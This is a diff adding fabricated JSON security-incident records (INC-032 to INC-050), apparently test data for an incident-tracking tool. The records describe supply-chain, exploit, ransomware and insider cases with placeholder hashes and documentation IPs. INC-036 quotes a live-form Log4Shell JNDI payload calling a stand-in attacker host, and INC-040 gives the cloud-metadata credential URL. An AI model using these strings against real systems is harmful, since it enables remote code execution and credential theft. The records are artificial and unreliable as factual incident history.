+    "resolved_at": "2026-01-21T18:00:00Z"
+  },
+  {
+    "id": "INC-032",
+    "title": "Supply chain attack — compromised third-party library update",
+    "description": "A widely used internal utility library (libutil v2.4.1) published to the internal Artifactory received an unauthorised update that added a reverse shell callback to 192.0.2.100 on startup. The update was signed with a valid signing key that belonged to a former contractor (offboarded 2025-11-01). 14 services consumed the update before it was pulled.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "192.0.2.100"}
+    ],
+    "tags": ["supply-chain", "artifactory", "code-signing", "reverse-shell", "offboarding-gap"],
+    "resolution_notes": "libutil rolled back to v2.4.0. 14 services restarted from clean builds. Former contractor signing key revoked from Artifactory. All 14 hosts forensicated — no evidence of successful reverse shell connection. Code signing key rotation policy reduced from annual to 90-day. Offboarding checklist updated to revoke Artifactory signing keys.",
+    "created_at": "2026-02-12T09:00:00Z",
+    "resolved_at": "2026-02-14T17:00:00Z"
+  },
+  {
+    "id": "INC-033",
+    "title": "Supply chain attack — SolarWinds-style update mechanism hijacked",
+    "description": "Network monitoring detected that MGMT-SERVER-01 (running an IT monitoring agent) made outbound HTTPS connections to 192.0.2.101 — not the legitimate vendor update server. The monitoring agent's auto-update was hijacked via a DNS hijack of updates.solarmonitor-vendor.com pointing to 192.0.2.101. A signed malicious update was delivered.",
+    "severity": "critical",
+    "status": "in_progress",
+    "iocs": [
+      {"type": "ipv4",   "value": "192.0.2.101"},
+      {"type": "domain", "value": "updates.solarmonitor-vendor.com"}
+    ],
+    "tags": ["supply-chain", "update-hijack", "dns-hijack", "monitoring-agent", "apt"],
+    "resolution_notes": "MGMT-SERVER-01 isolated. Auto-update disabled on all monitoring agents. DNS record for updates.solarmonitor-vendor.com corrected. Vendor notified and incident shared under responsible disclosure. Full forensic investigation underway. All monitoring agent hosts flagged for compromise assessment.",
+    "created_at": "2026-04-06T11:00:00Z",
+    "resolved_at": null
+  },
+  {
+    "id": "INC-034",
+    "title": "Supply chain attack — PyPI typosquat package installed in dev env",
+    "description": "A developer installed requets==2.28.2 (typosquatting requests) from PyPI. The package (SHA256: aabbccddeeff11223344aabbccddeeff11223344aabbccddeeff11223344aabbcc) exfiltrated environment variables and SSH keys to 192.0.2.100. The dev workstation had production database credentials in its shell environment.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "192.0.2.100"},
+      {"type": "sha256", "value": "aabbccddeeff11223344aabbccddeeff11223344aabbccddeeff11223344aabbcc"},
+      {"type": "domain", "value": "pypi.org"}
+    ],
+    "tags": ["supply-chain", "pypi", "typosquat", "credential-theft", "dev-environment"],
+    "resolution_notes": "requets package removed. Dev workstation rebuilt. Production DB credentials rotated. SSH keys revoked and re-generated. Cross-reference with INC-031 (same C2 IP 192.0.2.100). PyPI package name audit added to onboarding checklist. Pre-commit hook added to flag uncommon package names.",
+    "created_at": "2026-03-05T13:00:00Z",
+    "resolved_at": "2026-03-05T18:00:00Z"
+  },
+  {
+    "id": "INC-035",
+    "title": "Supply chain attack — container base image with crypto-miner",
+    "description": "Container scanning pipeline flagged base image python:3.11-slim pulled from Docker Hub as containing a crypto-miner binary (MD5: ffeeddccbbaa0011ffeeddccbbaa0011) injected into /usr/local/bin/python3.11. The image tag 3.11-slim had been replaced by an attacker who compromised the Docker Hub account of an image maintainer. 3 production containers deployed before detection.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "md5",    "value": "ffeeddccbbaa0011ffeeddccbbaa0011"},
+      {"type": "domain", "value": "hub.docker.com"}
+    ],
+    "tags": ["supply-chain", "docker", "container-image", "crypto-miner", "image-tampering"],
+    "resolution_notes": "3 production containers stopped and re-deployed from verified image (digest-pinned). Crypto-miner binary collected for analysis. Docker Hub image pull policy updated: all base images must be pinned by digest (not tag). Container scanning step made blocking in CI. Docker Hub maintainer credentials reset.",
+    "created_at": "2026-03-22T15:00:00Z",
+    "resolved_at": "2026-03-23T09:00:00Z"
+  },
+  {
+    "id": "INC-036",
+    "title": "Vulnerability exploitation — Apache Log4Shell (CVE-2021-44228) on public API",
+    "description": "WAF detected a JNDI injection string in the User-Agent header of requests to API-SERVER-01: ${jndi:ldap://exploit-infra.cc/a}. The request originated from 198.51.100.150. WAF blocked the LDAP callback, but log correlation showed the payload was also attempted without WAF on a staging endpoint. Staging server executed the LDAP callback and downloaded a Java payload (SHA256: 112233445566778899001122334455667788990011223344556677889900aabb).",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "198.51.100.150"},
+      {"type": "domain", "value": "exploit-infra.cc"},
+      {"type": "sha256", "value": "112233445566778899001122334455667788990011223344556677889900aabb"}
+    ],
+    "tags": ["vuln-exploit", "log4shell", "cve-2021-44228", "jndi-injection", "java"],
+    "resolution_notes": "Staging server isolated and rebuilt. log4j-core updated to 2.17.1 across all services. WAF rule deployed for all endpoints. LDAP outbound connections blocked from application servers. Threat intel shared: exploit-infra.cc blocked on DNS. CVE-2021-44228 patch applied to 23 remaining services within 24 hours.",
+    "created_at": "2026-01-10T22:00:00Z",
+    "resolved_at": "2026-01-12T14:00:00Z"
+  },
+  {
+    "id": "INC-037",
+    "title": "Vulnerability exploitation — ProxyLogon on on-prem Exchange",
+    "description": "IDS triggered on HTTP POST to /ecp/DDI/DDIService.svc/GetObject on EXCHANGE-01. The request from 198.51.100.150 exploited CVE-2021-26855 (ProxyLogon) to bypass authentication and write a web shell to C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\shell.aspx (MD5: 00112233445566778899aabbccddeeff). The web shell was accessed 4 times before detection.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",  "value": "198.51.100.150"},
+      {"type": "md5",   "value": "00112233445566778899aabbccddeeff"},
+      {"type": "url",   "value": "http://exchange-01/aspnet_client/system_web/shell.aspx"}
+    ],
+    "tags": ["vuln-exploit", "proxylogon", "cve-2021-26855", "exchange", "web-shell"],
+    "resolution_notes": "EXCHANGE-01 isolated. Web shell removed. Exchange patched to CU23+. Email queued during isolation delivered after recovery. Full Exchange IIS log review completed. 198.51.100.150 blocked. Post-incident: Exchange moved behind WAF. Admin panel moved off public internet.",
+    "created_at": "2026-02-03T16:00:00Z",
+    "resolved_at": "2026-02-05T12:00:00Z"
+  },
+  {
+    "id": "INC-038",
+    "title": "Vulnerability exploitation — SQL injection on customer portal",
+    "description": "WAF detected UNION-based SQL injection attempts on the customer portal (/search?q=) originating from 198.51.100.151. The attacker extracted the users table (email + bcrypt hashes, 142,000 rows) via time-delayed blind SQLi over 6 hours. WAF was in detect-only mode on the search endpoint.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",  "value": "198.51.100.151"},
+      {"type": "url",   "value": "http://customer-portal/search"}
+    ],
+    "tags": ["vuln-exploit", "sql-injection", "customer-portal", "data-breach", "waf-bypass"],
+    "resolution_notes": "WAF switched to block mode on /search. SQLi vulnerability patched (parameterised queries implemented). 142,000 users notified per GDPR. Bcrypt hashes strong (cost=12) — no password cracking expected. Rate limiting added to search endpoint. WAF moved to block mode across all public endpoints.",
+    "created_at": "2026-02-25T09:00:00Z",
+    "resolved_at": "2026-02-27T16:00:00Z"
+  },
+  {
+    "id": "INC-039",
+    "title": "Vulnerability exploitation — RCE via Confluence CVE-2022-26134",
+    "description": "Confluence server CONF-01 was exploited via CVE-2022-26134 (OGNL injection). The attacker from 198.51.100.152 injected a command that executed whoami and subsequently downloaded a Meterpreter stager (SHA256: aabb112233445566aabb112233445566aabb112233445566aabb112233445566). The stager phoned home to 192.0.2.150.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "198.51.100.152"},
+      {"type": "ipv4",   "value": "192.0.2.150"},
+      {"type": "sha256", "value": "aabb112233445566aabb112233445566aabb112233445566aabb112233445566"}
+    ],
+    "tags": ["vuln-exploit", "confluence", "cve-2022-26134", "ognl-injection", "meterpreter"],
+    "resolution_notes": "CONF-01 isolated and rebuilt. Confluence patched to 7.18.1. 192.0.2.150 blocked. Meterpreter stager hash submitted to EDR platform for detection. Confluence moved behind VPN — no longer public-facing. Emergency patching sprint initiated for all Atlassian products.",
+    "created_at": "2026-03-14T13:00:00Z",
+    "resolved_at": "2026-03-15T22:00:00Z"
+  },
+  {
+    "id": "INC-040",
+    "title": "Vulnerability exploitation — SSRF on internal microservice exposing cloud metadata",
+    "description": "A bug bounty report revealed SSRF in the image-resize microservice (/resize?url=). An external researcher accessed http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role and retrieved temporary AWS IAM keys. The keys were used to list S3 buckets from 198.51.100.153 before the researcher halted. No data accessed.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.153"},
+      {"type": "url",  "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role"}
+    ],
+    "tags": ["vuln-exploit", "ssrf", "cloud-metadata", "aws-iam", "bug-bounty"],
+    "resolution_notes": "IAM temporary credentials rotated immediately. SSRF vulnerability fixed (URL allowlist for image-resize). IMDSv2 enforced on all EC2 instances (removes unauthenticated metadata access). Bug bounty reward paid. SSRF test cases added to security regression suite.",
+    "created_at": "2026-04-02T14:00:00Z",
+    "resolved_at": "2026-04-03T10:00:00Z"
+  },
+  {
+    "id": "INC-041",
+    "title": "Phishing with malware attachment — Emotet dropper",
+    "description": "16 employees received emails from spoofed domain acme-secure.net with an attached Word document (SHA1: deadbeef5678deadbeef5678deadbeef56789999). Macros in the document downloaded Emotet from http://203.0.113.12/emotet/e.exe. 2 users enabled macros and executed the payload. Emotet then attempted SMTP credential brute-force from WKSTN-023.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain", "value": "acme-secure.net"},
+      {"type": "ipv4",   "value": "203.0.113.12"},
+      {"type": "sha1",   "value": "deadbeef5678deadbeef5678deadbeef56789999"},
+      {"type": "url",    "value": "http://203.0.113.12/emotet/e.exe"}
+    ],
+    "tags": ["phishing", "emotet", "macro-malware", "dropper", "smtp-abuse"],
+    "resolution_notes": "WKSTN-023 isolated and re-imaged. Emotet binary quarantined. acme-secure.net and 203.0.113.12 blocked. Macro execution policy set to 'Disable all macros without notification' via GPO. Email attachment filtering tightened: .doc/.docm now blocked.",
+    "created_at": "2026-01-25T10:00:00Z",
+    "resolved_at": "2026-01-26T15:00:00Z"
+  },
+  {
+    "id": "INC-042",
+    "title": "Ransomware — Hive variant via exposed RDP port",
+    "description": "RDP port (3389) exposed on JUMP-01 was brute-forced from 192.0.2.88 over 3 hours (8,000 attempts). Once inside, Hive ransomware (SHA256: f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e3) was deployed. 60 GB encrypted on attached network shares before containment.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "192.0.2.88"},
+      {"type": "sha256", "value": "f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e3"}
+    ],
+    "tags": ["ransomware", "hive", "rdp-brute-force", "exposed-port"],
+    "resolution_notes": "JUMP-01 isolated. Backups restored (4-hour RPO). RDP port removed from public internet — moved behind VPN. Account lockout policy tightened: 5 failed attempts → 30-minute lockout. 192.0.2.88 blocked and cross-referenced with INC-006 (same IP used in LockBit C2).",
+    "created_at": "2026-02-16T01:00:00Z",
+    "resolved_at": "2026-02-17T10:00:00Z"
+  },
+  {
+    "id": "INC-043",
+    "title": "C2 beaconing — TLS-encrypted beacon over port 443 to CDN-fronted C2",
+    "description": "Deception token planted in a honeypot document was triggered from WKSTN-099. Network analysis found the host beaconing to cloudfront.net (CDN-fronted) which resolved to 203.0.113.101 for the actual C2 backend. The C2 beacon ran inside a hijacked browser extension (CRX SHA256: ddee556677889900ddee556677889900ddee556677889900ddee556677889900).",
+    "severity": "medium",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "203.0.113.101"},
+      {"type": "sha256", "value": "ddee556677889900ddee556677889900ddee556677889900ddee556677889900"}
+    ],
+    "tags": ["c2-beaconing", "cdn-fronting", "browser-extension", "deception", "honeypot-triggered"],
+    "resolution_notes": "WKSTN-099 isolated. Malicious Chrome extension removed. CDN-fronted C2 IP blocked. Browser extension policy tightened: only extensions from allowlist permitted. Deception token database updated.",
+    "created_at": "2026-03-30T14:00:00Z",
+    "resolved_at": "2026-03-31T10:00:00Z"
+  },
+  {
+    "id": "INC-044",
+    "title": "Data exfiltration — Slack DM used to leak internal architecture docs",
+    "description": "CASB alert fired when WKSTN-078 user sent 14 internal architecture PDFs via Slack DM to an external personal workspace. The files were marked INTERNAL CONFIDENTIAL. The user is a recently hired contractor. File upload to external Slack workspace went via api.slack.com (185.0.0.50).",
+    "severity": "medium",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain", "value": "api.slack.com"},
+      {"type": "ipv4",   "value": "185.0.0.50"}
+    ],
+    "tags": ["data-exfil", "casb", "slack", "contractor", "architecture-docs"],
+    "resolution_notes": "Contractor's Slack access and corporate device access revoked. Architecture PDFs reclassified and watermarked. CASB policy updated to block external DMs containing INTERNAL CONFIDENTIAL labelled files. Legal reviewed contractor agreement — NDA clause applicable; contractor notified.",
+    "created_at": "2026-04-04T16:00:00Z",
+    "resolved_at": "2026-04-05T12:00:00Z"
+  },
+  {
+    "id": "INC-045",
+    "title": "Supply chain attack — GitHub Actions runner compromised",
+    "description": "A malicious GitHub Actions workflow from a fork PR modified the CI runner environment to exfiltrate GITHUB_TOKEN and AWS_SECRET_ACCESS_KEY to 192.0.2.100. The workflow was triggered by a maintainer approving a PR from an untrusted fork. Exfil reached 192.0.2.100 successfully before the pipeline was cancelled.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "192.0.2.100"},
+      {"type": "domain", "value": "github.com"}
+    ],
+    "tags": ["supply-chain", "github-actions", "ci-cd", "token-exfil", "fork-pr"],
+    "resolution_notes": "GITHUB_TOKEN rotated. AWS_SECRET_ACCESS_KEY rotated and CloudTrail reviewed — no unauthorised AWS API calls found within the token lifetime. GitHub branch protection rule updated: external fork PRs cannot trigger workflows without manual approval by security team. Cross-reference with INC-031 (same C2 IP 192.0.2.100).",
+    "created_at": "2026-03-18T12:00:00Z",
+    "resolved_at": "2026-03-18T18:00:00Z"
+  },
+  {
+    "id": "INC-046",
+    "title": "Lateral movement — Golden Ticket attack after domain compromise",
+    "description": "Following the DCSync in INC-025, forensic analysis found evidence of Golden Ticket usage. An attacker forged a Kerberos TGT with 10-year validity for a non-existent admin account. The forged ticket was used to access 3 file servers and an internal BI dashboard. Source connections came from 198.51.100.200.",
+    "severity": "critical",
+    "status": "in_progress",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.200"}
+    ],
+    "tags": ["lateral-movement", "golden-ticket", "kerberos-forging", "post-domain-compromise"],
+    "resolution_notes": "krbtgt password rotated a third time. Kerberos ticket lifetimes reduced to 4 hours. All file server access logs reviewed. BI dashboard access restricted to PAW. 198.51.100.200 tracked for attribution alongside INC-025.",
+    "created_at": "2026-04-09T09:00:00Z",
+    "resolved_at": null
+  },
+  {
+    "id": "INC-047",
+    "title": "Vuln exploit — XXE injection on internal XML-based API",
+    "description": "Penetration test report highlighted XXE vulnerability on /api/v1/import/xml endpoint of HR-API-01. During validation, the red team extracted /etc/passwd and AWS IMDSv1 credentials using an external entity pointing to 198.51.100.153. No real attacker exploitation found in logs, but the endpoint is internet-facing.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.153"},
+      {"type": "url",  "value": "http://hr-api-01/api/v1/import/xml"}
+    ],
+    "tags": ["vuln-exploit", "xxe", "xml-injection", "pentest-finding", "aws-iam"],
+    "resolution_notes": "XXE patched: external entity processing disabled in XML parser. HR-API-01 moved behind VPN. IMDSv2 enforced on the underlying EC2 instance. Penetration test findings logged in vulnerability tracker with 30-day SLA.",
+    "created_at": "2026-02-08T10:00:00Z",
+    "resolved_at": "2026-02-10T14:00:00Z"
+  },
+  {
+    "id": "INC-048",
+    "title": "Data exfiltration — rogue Wi-Fi access point collecting credentials",
+    "description": "Corporate wireless IDS detected a rogue AP broadcasting SSID 'CorpWifi-Guest' with BSSID spoofing the legitimate AP MAC. 6 employee devices auto-connected and may have transmitted credentials over the HTTP captive portal hosted on the rogue AP (IP 185.0.0.123). Event lasted 90 minutes in the main lobby.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "185.0.0.123"}
+    ],
+    "tags": ["data-exfil", "rogue-ap", "wifi", "credential-harvesting", "physical-layer"],
+    "resolution_notes": "Rogue AP identified and physical device removed by security team. 6 employee accounts force-reset. WIDS alerting tuned. WPA3-Enterprise rolled out to corporate SSID. Captive portal redesigned to use HTTPS with HSTS. Cross-reference with INC-019 (same IP 185.0.0.123 used in email forwarding rule creation).",
+    "created_at": "2026-03-27T13:00:00Z",
+    "resolved_at": "2026-03-27T16:30:00Z"
+  },
+  {
+    "id": "INC-049",
+    "title": "Insider threat — privileged database query exporting salary data",
+    "description": "PAM session recording flagged a DBA (DBA-002) executing SELECT * FROM hr.salaries without a corresponding ITSM change ticket. The query returned 4,200 salary rows. The DBA had previously been denied a promotion. Session recording showed the data was copy-pasted into a personal email draft in a personal webmail tab.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [],
+    "tags": ["insider-threat", "dba-abuse", "salary-data", "pam-session", "copy-paste-exfil"],
+    "resolution_notes": "DBA-002 suspended. Salary data classified as Restricted — DBA access to hr.salaries removed and routed via data masking layer for ops purposes. PAM alert for ad-hoc SELECT on sensitive tables elevated to P2. HR investigation initiated. Webmail blocked from managed devices.",
+    "created_at": "2026-04-07T15:00:00Z",
+    "resolved_at": "2026-04-08T12:00:00Z"
+  },
+  {
+    "id": "INC-050",
+    "title": "Vulnerability exploitation — Citrix Bleed (CVE-2023-4966) session hijack",
+    "description": "Citrix NetScaler ADC was found vulnerable to CVE-2023-4966 (Citrix Bleed). An attacker from 198.51.100.154 sent malformed HTTP requests to leak session tokens from NETSCALER-01 memory. Using leaked tokens, the attacker authenticated as 3 VPN users without credentials and pivoted internally for approximately 90 minutes before detection by anomaly analytics.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.154"}
+    ],
+    "tags": ["vuln-exploit", "citrix-bleed", "cve-2023-4966", "session-hijack", "netscaler", "vpn-abuse"],
+    "resolution_notes": "NETSCALER-01 patched to 13.1-49.15. All active VPN sessions terminated and tokens invalidated. 3 hijacked user accounts audited — limited internal access, no data exfil confirmed. 198.51.100.154 blocked. Vulnerability scanning cycle accelerated to weekly for perimeter appliances.",
+    "created_at": "2026-04-11T03:00:00Z",
+    "resolved_at": "2026-04-12T11:00:00Z"
+  }
+]
